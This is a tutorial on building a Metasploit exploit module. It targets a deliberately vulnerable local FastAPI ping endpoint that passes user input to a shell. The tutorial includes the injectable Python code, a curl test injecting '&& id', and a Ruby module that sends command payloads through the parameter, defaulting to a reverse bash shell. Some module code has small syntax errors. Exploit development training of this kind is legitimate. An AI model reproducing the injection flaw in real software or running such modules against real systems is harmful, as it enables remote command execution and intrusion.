## A Vulnerable Service
3. Copy the following code into your file:
```python
    from fastapi import FastAPI, Response
    import subprocess

    app = FastAPI()

    @app.get("/ping")
    def ping(ip : str):
        res = subprocess.run(f"ping -c 1 {ip}", shell=True, capture_output=True)
        return Response(content=res.stdout.decode("utf-8"), media_type="text/plain")
    ```

5. Test that the application works with `curl`:
```sh
    $ curl http://localhost:8000/ping?ip=1.1.1.1
    PING 1.1.1.1 (1.1.1.1) 56(84) bytes of data.
    64 bytes from 1.1.1.1: icmp_seq=1 ttl=58 time=16.7 ms

    --- 1.1.1.1 ping statistics ---
    1 packets transmitted, 1 received, 0% packet loss, time 0ms
    rtt min/avg/max/mdev = 16.739/16.739/16.739/0.000 ms
    ```

6. Test that your application is exploitable - also with `curl`:
```sh
    $ curl localhost:8000/ping?ip=1.1.1.1%20%26%26id
    PING 1.1.1.1 (1.1.1.1) 56(84) bytes of data.
    64 bytes from 1.1.1.1: icmp_seq=1 ttl=58 time=16.6 ms

    --- 1.1.1.1 ping statistics ---
    1 packets transmitted, 1 received, 0% packet loss, time 0ms
    rtt min/avg/max/mdev = 16.614/16.614/16.614/0.000 ms
    uid=1000(meta) gid=1000(meta)
    ```

## The Structure of a Module
### Where to put a Module
## A Shell of a Module
The shell of a module that follows the above format is something like this:
```ruby
class MetasploitModule < msf::Exploit::Remote
  Rank = GoodRanking
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    # empty for now
  end

  def filter_bad_chars(cmd)
    # empty for now
  end

  def execute_command(cmd, _opts = {})
    # empty for now
  end

  def exploit
    # empty for now
  end
end
```

## Initialize
The `initialize` method is used to define and pass metadata. Every `initialize` method in the metasploit-framework codebase follows the format of an empty `info` being passed into `update_info`, which gets passed to the `msf::Exploit::Remote` `initialize` method:
```ruby
def initialize(info = {})
  super(
    update_info(
      info,
      # Here is where the metadata goes
      'Name' => 'Command Injection against a test Ping endpoint',
      'Description' => 'This exploits a command injection vulnerability against a test application',
      'License' => MSF_LICENSE,
      'Author' => 'YOUR NAME',
      'References' => [
        ['URL', 'https://metasploit.com/']
      ],
      'DisclosureDate' => '2023-08-04',
      'Platform' => 'linux', # used for determining compatibility - if you're doing code injection, this may be the language of the webapp
      'Targets' => [
        'Unix Command',
        {
          'Platform' => ['linux', 'unix'], # linux and unix have different cmd payloads, this gives you more options
          'Arch' => ARCH_CMD,
          'Type' => :unix_cmd, # Running a command - this would be `:linux_dropper` for a cmdstager dropper
          'DefaultOptions' => {
            'PAYLOAD' => 'cmd/unix/reverse_bash',
            'RPORT' => 8000,
          }
        }
      ],
      'Payload' => {
        'BadChars' => '\x00',
      }
      'Notes' => { # Required for new modules https://docs.metasploit.com/docs/development/developing-modules/module-metadata/definition-of-module-reliability-side-effects-and-stability.html
        'Stability' => [CRASH_SAFE],
        'Reliability' => [REPEATABLE_SESSION],
        'SideEffects' => [IOC_IN_LOGS]
      }
      # Some more metadata options are here: https://docs.metasploit.com/docs/development/developing-modules/module-metadata/module-reference-identifiers.html#code-example-of-references-in-a-module
    )
  )
end
```

## Filtering
Encoding requirements might change based on the application you're trying to inject, so experiment if things aren't working.
```ruby
def filter_bad_chars(cmd)
  return cmd
    .gsub(/&/, '%26')
    .gsub(/ /, '%20')
end
```

## Execution
The `execute_command` method takes in `cmd` and `_opts` and executes the command on the target. In our case, executing a command is simply adding the command to a GET request and sending it to the `/ping` endpoint on our sample service.
```ruby
def execute_command(cmd, _opts = {})
  send_request_cgi({
    'method' => 'GET',
    'uri' => '/ping',
    'encode_params' => false,
    'vars_get' => {
      'ip' => "bing.com%20%26%26%20#{filter_bad_chars(cmd)}",
    }
  })
end
```

## Exploitation
To finish up, all we need is to define the `exploit` method. This method is called by Metasploit when you use `run` within a msfconsole. All that we'll do here is print a little status message and run the exploit, but later you can modify this method to handle droppers as well:
```ruby
def exploit
  print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
  execute_command(payload.encoded)
end
```

If you're running Metasploit and the vulnerable Python service on the same machine, you should be able to simply set the variables and fire:
```sh
set RHOST 127.0.0.1
set LHOST 127.0.0.1
run
```

